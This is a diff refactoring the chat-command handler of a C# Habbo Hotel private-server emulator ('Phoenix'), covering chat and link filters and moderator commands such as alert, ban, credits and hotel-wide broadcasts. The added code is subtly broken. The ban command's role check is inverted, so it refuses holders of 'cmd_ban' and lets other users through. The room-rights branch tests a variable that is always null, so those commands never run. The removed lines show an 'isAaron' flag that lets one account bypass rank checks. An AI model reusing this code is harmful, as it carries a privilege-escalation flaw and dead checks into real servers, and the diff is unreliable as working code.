@@ -17,78 +17,82 @@ using Phoenix.Storage;
 using System.Net;
 namespace Phoenix.HabboHotel.Misc
 {
-	internal sealed class ChatCommandHandler
-	{
-		private static List<string> BadWords;
-		private static List<string> BadReplacement;
-		private static List<bool> BadStrict;
-		private static List<string> ExternalLinks;
-		public static void initFilter(DatabaseClient dbClient)
-		{
+    internal class ChatCommandHandler
+    {
+        private static List<string> BadWords;
+        private static List<string> BadReplacement;
+        private static List<bool> BadStrict;
+        private static List<string> ExternalLinks;
+
+        public static void InitFilter(DatabaseClient dbClient)
+        {
             Logging.Write("Loading Chat Filter..");
-			ChatCommandHandler.BadWords = new List<string>();
-			ChatCommandHandler.BadReplacement = new List<string>();
-			ChatCommandHandler.BadStrict = new List<bool>();
-			ChatCommandHandler.ExternalLinks = new List<string>();
-			ChatCommandHandler.InitWords(dbClient);
+            BadWords = new List<string>();
+            BadReplacement = new List<string>();
+            BadStrict = new List<bool>();
+            ExternalLinks = new List<string>();
+            UpdateFilters(dbClient);
             Logging.WriteLine("completed!");
-		}
-		public static void InitWords(DatabaseClient dbClient)
-		{
-			ChatCommandHandler.BadWords.Clear();
-			ChatCommandHandler.BadReplacement.Clear();
-			ChatCommandHandler.BadStrict.Clear();
-			ChatCommandHandler.ExternalLinks.Clear();
-			DataTable dataTable = dbClient.ReadDataTable("SELECT * FROM wordfilter ORDER BY word ASC;");
-			if (dataTable != null)
-			{
-				foreach (DataRow dataRow in dataTable.Rows)
-				{
-					ChatCommandHandler.BadWords.Add(dataRow["word"].ToString());
-					ChatCommandHandler.BadReplacement.Add(dataRow["replacement"].ToString());
-					ChatCommandHandler.BadStrict.Add(PhoenixEnvironment.EnumToBool(dataRow["strict"].ToString()));
-				}
-			}
-			DataTable dataTable2 = dbClient.ReadDataTable("SELECT * FROM linkfilter;");
-			if (dataTable2 != null)
-			{
-				foreach (DataRow dataRow in dataTable2.Rows)
-				{
-					ChatCommandHandler.ExternalLinks.Add(dataRow["externalsite"].ToString());
-				}
-			}
-		}
-		public static bool CheckExternalLink(string Website)
-		{
-			if (GlobalClass.ExternalLinkMode == "disabled")
-			{
-				return false;
-			}
-			else
-			{
-				if ((Website.StartsWith("http://") || Website.StartsWith("www.") || Website.StartsWith("https://")) && ChatCommandHandler.ExternalLinks != null && ChatCommandHandler.ExternalLinks.Count > 0)
-				{
-					foreach (string current in ChatCommandHandler.ExternalLinks)
-					{
-						if (Website.Contains(current))
-						{
-							if (GlobalClass.ExternalLinkMode == "whitelist")
-							{
-								return true;
-							}
-							if (!(GlobalClass.ExternalLinkMode == "blacklist"))
-							{
-							}
-						}
-					}
-				}
-				return (Website.StartsWith("http://") || Website.StartsWith("www.") || (Website.StartsWith("https://") && GlobalClass.ExternalLinkMode == "blacklist") || (GlobalClass.ExternalLinkMode == "whitelist" && false));
-			}
-		}
+        }
+
+        #region Filters
+
+        public static void UpdateFilters(DatabaseClient dbClient)
+        {
+            ChatCommandHandler.BadWords.Clear();
+            ChatCommandHandler.BadReplacement.Clear();
+            ChatCommandHandler.BadStrict.Clear();
+            ChatCommandHandler.ExternalLinks.Clear();
+            DataTable Table = dbClient.ReadDataTable("SELECT * FROM wordfilter ORDER BY word ASC;");
+            if (Table != null)
+            {
+                foreach (DataRow Row in Table.Rows)
+                {
+                    ChatCommandHandler.BadWords.Add(Row["word"].ToString());
+                    ChatCommandHandler.BadReplacement.Add(Row["replacement"].ToString());
+                    ChatCommandHandler.BadStrict.Add(PhoenixEnvironment.EnumToBool(Row["strict"].ToString()));
+                }
+            }
+            DataTable Table2 = dbClient.ReadDataTable("SELECT * FROM linkfilter;");
+            if (Table2 != null)
+            {
+                foreach (DataRow Row in Table2.Rows)
+                {
+                    ChatCommandHandler.ExternalLinks.Add(Row["externalsite"].ToString());
+                }
+            }
+        }
+
+        public static bool CheckExternalLink(string Website)
+        {
+            if (GlobalClass.ExternalLinkMode == "disabled")
+            {
+                return false;
+            }
+            else if ((Website.StartsWith("http://") || Website.StartsWith("www.") || Website.StartsWith("https://")) && ChatCommandHandler.ExternalLinks != null && ChatCommandHandler.ExternalLinks.Count > 0)
+            {
+                foreach (string current in ChatCommandHandler.ExternalLinks)
+                {
+                    if (Website.Contains(current))
+                    {
+                        if (GlobalClass.ExternalLinkMode == "whitelist")
+                        {
+                            return true;
+                        }
+                        if (!(GlobalClass.ExternalLinkMode == "blacklist"))
+                        {
+                        }
+                    }
+                }
+            }
+            return (Website.StartsWith("http://") || Website.StartsWith("www.") || (Website.StartsWith("https://") && GlobalClass.ExternalLinkMode == "blacklist") || (GlobalClass.ExternalLinkMode == "whitelist" && false));
+        }
+
         public static string ApplyAdfly(string Input)
         {
             return Input;
         }
+
         public static string ApplyWordFilter(string Input)
         {
             if ((BadWords != null) && (BadWords.Count > 0))
@@ -110,1463 +114,826 @@ namespace Phoenix.HabboHotel.Misc
             return Input;
         }
 
-		public static bool Parse(GameClient Session, string Input)
-		{
-			string[] Params = Input.Split(new char[]
-			{
-				' '
-			});
-			GameClient TargetClient = null;
-			Room room = Session.GetHabbo().CurrentRoom;
-			if (!PhoenixEnvironment.GetGame().GetRoleManager().CommandsList.ContainsKey(Params[0]))
-			{
-				return false;
-			}
-			else
-			{
-				try
-				{
-					int num;
-					if (room != null && room.CheckRights(Session, true))
-					{
-						num = PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]];
-						if (num <= 33)
-						{
-							if (num == 8)
-							{
-								room = Session.GetHabbo().CurrentRoom;
-								if (room.bool_5)
-								{
-									room.bool_5 = false;
-								}
-								else
-								{
-									room.bool_5 = true;
-								}
-								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-								return true;
-							}
-							if (num == 33)
-							{
-								room = Session.GetHabbo().CurrentRoom;
-								if (room != null && room.CheckRights(Session, true))
-								{
-									List<RoomItem> list = room.method_24(Session);
-									Session.GetHabbo().GetInventoryComponent().method_17(list);
-									Session.GetHabbo().GetInventoryComponent().UpdateItems(true);
-									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input + " " + Session.GetHabbo().CurrentRoomId);
-									return true;
-								}
-								return false;
-							}
-						}
-						else
-						{
-							if (num == 46)
-							{
-								room = Session.GetHabbo().CurrentRoom;
-								try
-								{
-									int num2 = int.Parse(Params[1]);
-									if (Session.GetHabbo().Rank >= 6)
-									{
-										room.UsersMax = num2;
-									}
-									else
-									{
-										if (num2 > 100 || num2 < 5)
-										{
-											Session.SendNotif("ERROR: Use a number between 5 and 100");
-										}
-										else
-										{
-											room.UsersMax = num2;
-										}
-									}
-								}
-								catch
-								{
-									return false;
-								}
-								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-								return true;
-							}
-							if (num == 53)
-							{
-								room = Session.GetHabbo().CurrentRoom;
-								PhoenixEnvironment.GetGame().GetRoomManager().UnloadRoom(room);
-								PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-								return true;
-							}
-						}
-					}
-					switch (PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]])
-					{
-					case 2:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_alert"))
-						{
-							return false;
-						}
-						string TargetUser = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(TargetUser);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("Could not find user: " + TargetUser);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
+        #endregion
+
+        internal static Boolean Parse(GameClient Session, string Input)
+        {
+            string[] Params = Input.Split(' ');
+
+            string TargetUser = null;
+            GameClient TargetClient = null;
+            Room TargetRoom = null;
+            RoomUser TargetRoomUser = null;
+            Habbo TargetHabbo = null;
+            if (!PhoenixEnvironment.GetGame().GetRoleManager().CommandsList.ContainsKey(Params[0]))
+            {
+                return false;
+            }
+            else
+            {
+                try
+                {
+                    int num;
+                    if (TargetRoom != null && TargetRoom.CheckRights(Session, true))
+                    {
+                        num = PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]];
+                        if (num <= 33)
+                        {
+                            if (num == 8)
+                            {
+                                TargetRoom = Session.GetHabbo().CurrentRoom;
+                                if (TargetRoom.bool_5)
+                                {
+                                    TargetRoom.bool_5 = false;
+                                }
+                                else
+                                {
+                                    TargetRoom.bool_5 = true;
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (num == 33)
+                            {
+                                TargetRoom = Session.GetHabbo().CurrentRoom;
+                                if (TargetRoom != null && TargetRoom.CheckRights(Session, true))
+                                {
+                                    List<RoomItem> list = TargetRoom.method_24(Session);
+                                    Session.GetHabbo().GetInventoryComponent().method_17(list);
+                                    Session.GetHabbo().GetInventoryComponent().UpdateItems(true);
+                                    PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input + " " + Session.GetHabbo().CurrentRoomId);
+                                    return true;
+                                }
+                                return false;
+                            }
+                        }
+                        else
+                        {
+                            if (num == 46)
+                            {
+                                TargetRoom = Session.GetHabbo().CurrentRoom;
+                                try
+                                {
+                                    int num2 = int.Parse(Params[1]);
+                                    if (Session.GetHabbo().Rank >= 6)
+                                    {
+                                        TargetRoom.UsersMax = num2;
+                                    }
+                                    else
+                                    {
+                                        if (num2 > 100 || num2 < 5)
+                                        {
+                                            Session.SendNotif("ERROR: Use a number between 5 and 100");
+                                        }
+                                        else
+                                        {
+                                            TargetRoom.UsersMax = num2;
+                                        }
+                                    }
+                                }
+                                catch
+                                {
+                                    return false;
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (num == 53)
+                            {
+                                TargetRoom = Session.GetHabbo().CurrentRoom;
+                                PhoenixEnvironment.GetGame().GetRoomManager().UnloadRoom(TargetRoom);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                        }
+                    }
+                    switch (PhoenixEnvironment.GetGame().GetRoleManager().CommandsList[Params[0]])
+                    {
+                        #region Moderation Commands
+                        #region CMD Alert
+                        case 2: //CMD Alert
+                            if (!Session.GetHabbo().HasRole("cmd_alert"))
+                            {
+                                return false;
+                            }
+
+                            TargetUser = Params[1];
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(TargetUser);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("Could not find user: " + TargetUser);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            TargetClient.SendNotif(MergeParams(Params, 2), 0);
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
                             return true;
-						}
-						TargetClient.SendNotif(ChatCommandHandler.MergeParams(Params, 2), 0);
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-                        return true;
-					}
-					case 3:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_award"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						PhoenixEnvironment.GetGame().GetAchievementManager().UnlockNextAchievement(TargetClient, Convert.ToUInt32(ChatCommandHandler.MergeParams(Params, 2)));
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 4:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_ban"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User not found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to ban that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						int num3 = 0;
-						try
-						{
-							num3 = int.Parse(Params[2]);
-						}
-						catch (FormatException)
-						{
-						}
-						if (num3 <= 600)
-						{
-							Session.SendNotif("Ban time is in seconds and must be at least than 600 seconds (ten minutes). For more specific preset ban times, use the mod tool.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, (double)num3, ChatCommandHandler.MergeParams(Params, 3), false);
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 6:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_coins"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User could not be found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						int num4;
-						if (int.TryParse(Params[2], out num4))
-						{
-							TargetClient.GetHabbo().Credits = TargetClient.GetHabbo().Credits + num4;
-							TargetClient.GetHabbo().UpdateCreditsBalance(true);
-							TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + num4.ToString() + " credits!");
-							Session.SendNotif("Credit balance updated successfully.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						Session.SendNotif("Please send a valid amount of credits.");
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 7:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_coords"))
-						{
-							return false;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							return false;
-						}
-						RoomUser class3 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-						if (class3 == null)
-						{
-							return false;
-						}
-						Session.SendNotif(string.Concat(new object[]
-						{
-							"X: ",
-							class3.X,
-							" - Y: ",
-							class3.Y,
-							" - Z: ",
-							class3.Z,
-							" - Rot: ",
-							class3.RotBody,
-							", sqState: ",
-							room.Byte_0[class3.X, class3.Y].ToString()
-						}));
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 11:
-						if (Session.GetHabbo().HasRole("cmd_enable"))
-						{
-							int int_ = int.Parse(Params[1]);
-							Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(int_, true);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 14:
-						if (Session.GetHabbo().HasRole("cmd_freeze"))
-						{
-							RoomUser class4 = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Params[1]);
-							if (class4 != null)
-							{
-								class4.bool_5 = !class4.bool_5;
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 15:
-						if (Session.GetHabbo().HasRole("cmd_givebadge"))
-						{
-							TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-							if (TargetClient != null)
-							{
-								TargetClient.GetHabbo().GetBadgeComponent().GiveBadge(TargetClient, PhoenixEnvironment.FilterInjectionChars(Params[2]), true);
-							}
-							else
-							{
-								Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 16:
-						if (Session.GetHabbo().HasRole("cmd_globalcredits"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_18(num5);
-								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-								{
-									class5.ExecuteQuery("UPDATE users SET credits = credits + " + num5);
-								}
-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 17:
-						if (Session.GetHabbo().HasRole("cmd_globalpixels"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_19(num5, false);
-								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-								{
-									class5.ExecuteQuery("UPDATE users SET activity_points = activity_points + " + num5);
-								}
-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 18:
-						if (Session.GetHabbo().HasRole("cmd_globalpoints"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_20(num5, false);
-								using (DatabaseClient class5 = PhoenixEnvironment.GetDatabase().GetClient())
-								{
-									class5.ExecuteQuery("UPDATE users SET vip_points = vip_points + " + num5);
-								}
-							}
-							catch
-							{
-								Session.SendNotif("Input must be a number");
-							}
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 19:
-						if (Session.GetHabbo().HasRole("cmd_hal"))
-						{
-							string text2 = Params[1];
-							Input = Input.Substring(4).Replace(text2, "");
-							string text3 = Input.Substring(1);
-							ServerMessage Message = new ServerMessage(161u);
-							Message.AppendStringWithBreak(string.Concat(new string[]
+                        #endregion
+                        #region CMD Award
+                        case 3: //CMD Award
+
+                            if (!Session.GetHabbo().HasRole("cmd_award"))
+                            {
+                                return false;
+                            }
+
+                            TargetUser = Params[1];
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(TargetUser);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("Could not find user: " + TargetUser);
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            PhoenixEnvironment.GetGame().GetAchievementManager().UnlockNextAchievement(TargetClient, Convert.ToUInt32(MergeParams(Params, 2)));
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Ban
+                        case 4: //CMD Ban
+                            if (Session.GetHabbo().HasRole("cmd_ban"))
+                            {
+                                return false;
+                            }
+
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User not found");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank)
+                            {
+                                Session.SendNotif("You are not allowed to ban that user.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+
+                            int BanTime = 0;
+                            try
+                            {
+                                BanTime = int.Parse(Params[2]);
+                            }
+                            catch (FormatException) { }
+
+                            if (BanTime <= 600)
+                            {
+                                Session.SendNotif("Ban time is in seconds and must be at least than 600 seconds (ten minutes). For more specific preset ban times, use the mod tool.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, BanTime, MergeParams(Params, 3), false);
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Coins
+                        case 6: //CMD Coins
+                            if (!Session.GetHabbo().HasRole("cmd_coins"))
+                            {
+                                return false;
+                            }
+
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            if (TargetClient == null)
+                            {
+                                Session.SendNotif("User could not be found.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            int creditsToAdd;
+                            if (int.TryParse(Params[2], out creditsToAdd))
+                            {
+                                TargetClient.GetHabbo().Credits = TargetClient.GetHabbo().Credits + creditsToAdd;
+                                TargetClient.GetHabbo().UpdateCreditsBalance(true);
+                                TargetClient.SendNotif(Session.GetHabbo().Username + " has awarded you " + creditsToAdd.ToString() + " credits.");
+                                Session.SendNotif("Credit balance updated successful.");
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            Session.SendNotif("Please send a valid amount of credits.");
+                            PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                            return true;
+                        #endregion
+                        #region CMD Freeze
+                        case 14: //CMD Freeze
+                            if (Session.GetHabbo().HasRole("cmd_freeze"))
+                            {
+
+                                TargetRoomUser = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Params[1]);
+                                if (TargetRoomUser != null)
+                                {
+                                    TargetRoomUser.bool_5 = !TargetRoomUser.bool_5;
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD GiveBadge
+                        case 15: //CMD GiveBadge
+                            if (Session.GetHabbo().HasRole("cmd_givebadge"))
+                            {
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+
+                                if (TargetClient != null)
+                                {
+                                    TargetClient.GetHabbo().GetBadgeComponent().GiveBadge(TargetClient, PhoenixEnvironment.FilterInjectionChars(Params[2]), true);
+                                }
+                                else
+                                {
+                                    Session.SendNotif("User: " + Params[1] + " could not be found in the database.\rPlease try your request again.");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD GlobalCredits
+                        case 16: //CMD GlobalCredits
+                            if (Session.GetHabbo().HasRole("cmd_globalcredits"))
+                            {
+                                try
+                                {
+                                    int GCreditsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GiveCredits(GCreditsToAdd);
+                                    using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                    {
+                                        adapter.ExecuteQuery("UPDATE users SET credits = credits + " + GCreditsToAdd);
+                                    }
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD GlobalPixels
+                        case 17: //CMD GlobalPixels
+                            if (Session.GetHabbo().HasRole("cmd_globalpixels"))
+                            {
+                                try
+                                {
+                                    int pixelsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GivePixels(pixelsToAdd, false);
+                                    using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                    {
+                                        adapter.ExecuteQuery("UPDATE users SET activity_points = activity_points + " + pixelsToAdd);
+                                    }
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD GlobalPoints
+                        case 18: //CMD GlobalPoints
+                            if (Session.GetHabbo().HasRole("cmd_globalpoints"))
+                            {
+                                try
+                                {
+                                    int pointsToAdd = int.Parse(Params[1]);
+                                    PhoenixEnvironment.GetGame().GetClientManager().GivePoints(pointsToAdd, false);
+                                    using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                    {
+                                        adapter.ExecuteQuery("UPDATE users SET vip_points = vip_points + " + pointsToAdd);
+                                    }
+                                }
+                                catch
+                                {
+                                    Session.SendNotif("Input must be a number");
+                                }
+                                PhoenixEnvironment.GetGame().GetClientManager().RecordCmdLogs(Session, Params[0].ToLower(), Input);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD HaL
+                        case 19: //CMD HaL
+                            if (Session.GetHabbo().HasRole("cmd_hal"))
+                            {
+                                string msg = Params[1];
+                                Input = Input.Substring(4).Replace(msg, "");
+                                string url = Input.Substring(1);
+                                ServerMessage Message = new ServerMessage(161);
+                                Message.AppendStringWithBreak(string.Concat(new string[]
 							{
 								TextManager.GetText("cmd_hal_title"),
 								"\r\n",
-								text3,
+								url,
 								"\r\n-",
 								Session.GetHabbo().Username
 							}));
-							Message.AppendStringWithBreak(text2);
-							PhoenixEnvironment.GetGame().GetClientManager().QueueBroadcaseMessage(Message);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 20:
-						if (Session.GetHabbo().HasRole("cmd_ha"))
-						{
-							string str = Input.Substring(3);
-							ServerMessage Message2 = new ServerMessage(808u);
-							Message2.AppendStringWithBreak(TextManager.GetText("cmd_ha_title"));
-							Message2.AppendStringWithBreak(str + "\r\n- " + Session.GetHabbo().Username);
-							ServerMessage Message3 = new ServerMessage(161u);
-							Message3.AppendStringWithBreak(str + "\r\n- " + Session.GetHabbo().Username);
-							PhoenixEnvironment.GetGame().GetClientManager().BroadcastMessage(Message2, Message3);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;;
-					case 21:
-						if (Session.GetHabbo().HasRole("cmd_invisible"))
-						{
-                            Session.GetHabbo().Visible = !Session.GetHabbo().Visible;
-                            Session.SendNotif("You are now " + (Session.GetHabbo().Visible ? "visible" : "invisible") + "\nTo apply the changes reload the room ;D"
-                                
-                                
-                                );
-							return true;
-						}
-						return false;
-					case 22:
-						if (!Session.GetHabbo().HasRole("cmd_ipban"))
-						{
-							return false;
-						}
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("User not found.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (TargetClient.GetHabbo().Rank >= Session.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to ban that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						PhoenixEnvironment.GetGame().GetBanManager().BanUser(TargetClient, Session.GetHabbo().Username, 360000000.0, ChatCommandHandler.MergeParams(Params, 2), true);
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					case 23:
-					{
-						if (!Session.GetHabbo().HasRole("cmd_kick"))
-						{
-							return false;
-						}
-						string text = Params[1];
-						TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-						if (TargetClient == null)
-						{
-							Session.SendNotif("Could not find user: " + text);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (Session.GetHabbo().Rank <= TargetClient.GetHabbo().Rank && !Session.GetHabbo().isAaron)
-						{
-							Session.SendNotif("You are not allowed to kick that user.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						if (TargetClient.GetHabbo().CurrentRoomId < 1u)
-						{
-							Session.SendNotif("That user is not in a room and can not be kicked.");
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(TargetClient.GetHabbo().CurrentRoomId);
-						if (room == null)
-						{
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						room.RemoveUserFromRoom(TargetClient, true, false);
-						if (Params.Length > 2)
-						{
-							TargetClient.SendNotif("A moderator has kicked you from the room for the following reason: " + ChatCommandHandler.MergeParams(Params, 2));
-						}
-						else
-						{
-							TargetClient.SendNotif("A moderator has kicked you from the room.");
-						}
-						PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-						return true;
-					}
-					case 24:
-						if (Session.GetHabbo().HasRole("cmd_massbadge"))
-						{
-							PhoenixEnvironment.GetGame().GetClientManager().method_21(Params[1]);
-							PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-							return true;
-						}
-						return false;
-					case 25:
-						if (Session.GetHabbo().HasRole("cmd_masscredits"))
-						{
-							try
-							{
-								int num5 = int.Parse(Params[1]);
-								PhoenixEnvironment.GetGame().GetClientManager().method_18(num5);
